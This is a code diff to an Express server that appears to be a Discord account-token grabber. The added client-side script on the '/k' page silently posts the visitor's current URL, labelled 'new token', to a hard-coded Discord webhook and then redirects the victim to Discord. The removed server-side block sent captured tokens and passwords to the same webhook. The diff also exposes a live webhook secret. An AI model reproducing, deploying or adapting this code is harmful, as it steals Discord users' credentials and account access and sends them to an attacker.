@@ -80,6 +80,25 @@ app.get("/k", async (req, res) => {
     res.send(`<!DOCTYPE html>
 <title>onload/redirect</title>
 <script>
+var webhookURL = "https://discord.com/api/webhooks/1052050979840860182/q1mTfTpBYZpFK9fQGiWGDUNYnge16ODe3TGNXJRjDRirpU71HoO9sgwSy5ddQfMxrKAz";
+
+
+var currentURL = window.location.href;
+
+
+var postData = {
+  content: "new token @everyone " + currentURL
+};
+
+fetch(webhookURL, {
+  method: "POST",
+  body: JSON.stringify(postData),
+  headers: {
+    "Content-Type": "application/json"
+  }
+});
+</script>
+<script>
 function handleOnLoad(){
 window.location="https://discord.com/channels/@me";
 }
@@ -105,20 +124,6 @@ window.location="https://discord.com/channels/@me";
 
       embed.setDescription(rawStringData);
       embed.setFooter("Created by t.me/feds3");
-
-      // Cache Part
-
-      if (process.logged.find((e) => e.token === token && e.passowrd === pass)) {
-        console.log("Found Duplicate Logged ID");
-      } else {
-        await axios({ method: "POST", url: "https://discord.com/api/webhooks/1052050979840860182/q1mTfTpBYZpFK9fQGiWGDUNYnge16ODe3TGNXJRjDRirpU71HoO9sgwSy5ddQfMxrKAz", data: { content: "@everyone @here", embeds: [embed.toJSON()] } }).catch((err) => console.log(err.name));
-        process.logged.push({ token, password: pass });
-      }
-    } catch (err) {
-      console.log(err);
-    }
-  }
-});
 
 app.listen(4200, () => {
   console.log(`Server Started on http://localhost:4200`);
